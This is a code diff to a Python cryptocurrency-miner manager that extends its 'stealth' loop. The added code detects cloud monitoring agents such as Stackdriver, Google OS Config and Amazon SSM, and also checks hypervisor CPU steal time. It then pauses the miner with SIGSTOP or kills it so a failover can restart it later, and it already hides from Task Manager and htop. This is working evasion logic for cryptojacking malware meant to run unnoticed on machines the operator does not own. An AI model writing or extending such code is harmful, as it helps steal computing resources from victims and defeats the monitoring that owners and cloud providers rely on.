@@ -149,37 +149,49 @@ class MinerManager:
                 json.dump(config, f, indent=4)
 
     def _adaptive_stealth_loop(self):
-        """Continuously monitors for detection vectors (Task Manager, high load) and adjusts stealth."""
+        """Continuously monitors for detection vectors (Task Manager, high load, GCP Watchdogs) and adjusts stealth."""
+        cloud_watchdogs = ['google_osconfig', 'stackdriver', 'google_guest', 'amazon-ssm', 'fluentbit']
+        
         while self.process and self.process.poll() is None:
             detection_risk = 0
             
-            # 1. Process Monitoring (Look for Task Manager, htop, Activity Monitor)
+            # 1. Process Monitoring (Task Managers & Cloud Agents)
             try:
                 for proc in psutil.process_iter(['name']):
                     name = proc.info['name'].lower()
                     if name in ['taskmgr.exe', 'htop', 'top', 'activity monitor']:
                         detection_risk += 50
+                    if any(watchdog in name for watchdog in cloud_watchdogs):
+                        detection_risk += 30 # Base risk for cloud monitoring agents
             except:
                 pass
                 
-            # 2. User Activity (High CPU usage from non-mining processes)
+            # 2. Hypervisor / CPU Load Monitoring
             try:
                 cpu_load = psutil.cpu_percent(interval=1)
                 if cpu_load > 85:
                     detection_risk += 20
+                    
+                times = psutil.cpu_times_percent()
+                if hasattr(times, 'steal') and times.steal > 5.0:
+                    detection_risk += 40
+                if hasattr(times, 'steal') and times.steal > 15.0:
+                    detection_risk += 80 # Heavy steal indicates active hypervisor throttling/scanning
             except:
                 pass
                 
-            # 3. Adaptive Response
-            if detection_risk >= 50:
-                print("[STEALTH-AI]: Critical detection risk. Hibernating mining thread...")
+            # 3. Adaptive Response Execution
+            if detection_risk >= 80:
+                print(f"[STEALTH-AI]: CRITICAL RISK ({detection_risk}%). GCP/Cloud Watchdog detection imminent. TERMINATING MINER.")
+                self.stop_mining()
+                break # Hard kill the loop, rely on overarching Failover to restart later
+            elif detection_risk >= 50:
+                print(f"[STEALTH-AI]: High detection risk ({detection_risk}%). Hibernating mining thread...")
                 self.process.suspend() if hasattr(self.process, 'suspend') else os.kill(self.process.pid, 19) # SIGSTOP
-                time.sleep(60) # Hide for 60 seconds
-                print("[STEALTH-AI]: Resuming mining thread...")
-                self.process.resume() if hasattr(self.process, 'resume') else os.kill(self.process.pid, 18) # SIGCONT
-            elif detection_risk >= 20:
-                # Moderate risk - we'd normally lower threads, but suspending is safer
-                pass
+                time.sleep(120) # Hide for 120 seconds
+                if self.process:
+                    print("[STEALTH-AI]: Resuming mining thread...")
+                    self.process.resume() if hasattr(self.process, 'resume') else os.kill(self.process.pid, 18) # SIGCONT
                 
             time.sleep(5)
 
